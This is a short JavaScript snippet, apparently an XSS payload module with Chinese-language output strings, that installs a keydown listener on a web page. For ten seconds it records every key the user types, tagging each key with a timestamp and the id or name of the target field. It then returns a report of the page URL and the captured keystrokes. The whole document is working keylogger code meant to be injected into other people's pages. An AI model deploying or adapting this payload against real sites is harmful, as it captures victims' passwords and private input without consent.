if (!window.xssKeylogger) { 
  window.xssKeylogger = { 
    buffer: [], 
    startTime: Date.now(), 
    isActive: false 
  }; 
} 

if (!window.xssKeylogger.isActive) { 
  window.xssKeylogger.isActive = true; 
  window.xssKeylogger.startTime = Date.now(); 
  window.xssKeylogger.buffer = []; 
  
  document.addEventListener('keydown', function(e) { 
    if (e.key.length === 1 || ['Enter', 'Tab', 'Space', 'Backspace', 'Delete'].includes(e.key)) { 
      window.xssKeylogger.buffer.push({ 
        key: e.key === ' ' ? 'Space' : e.key, 
        time: new Date().toLocaleTimeString(), 
        target: e.target.tagName + (e.target.id ? '#' + e.target.id : '') + (e.target.name ? '[' + e.target.name + ']' : '') 
      }); 
    } 
  }); 
  
  return new Promise((resolve) => { 
    setTimeout(() => { 
      let result = '键盘记录结果 (10秒监听):\n'; 
      result += '页面: ' + window.location.href + '\n'; 
      result += '记录条数: ' + window.xssKeylogger.buffer.length + '\n'; 
      result += '时间: ' + new Date().toLocaleString() + '\n\n'; 
      
      if (window.xssKeylogger.buffer.length > 0) { 
        result += '按键记录:\n'; 
        window.xssKeylogger.buffer.forEach((item, i) => { 
          result += (i + 1) + '. [' + item.time + '] ' + item.key + ' (' + item.target + ')\n'; 
        }); 
      } else { 
        result += '10秒内无按键记录'; 
      } 
      
      window.xssKeylogger.isActive = false; 
      resolve(result); 
    }, 10000); 
  }); 
} else { 
  return '键盘记录器已在运行中...'; 
}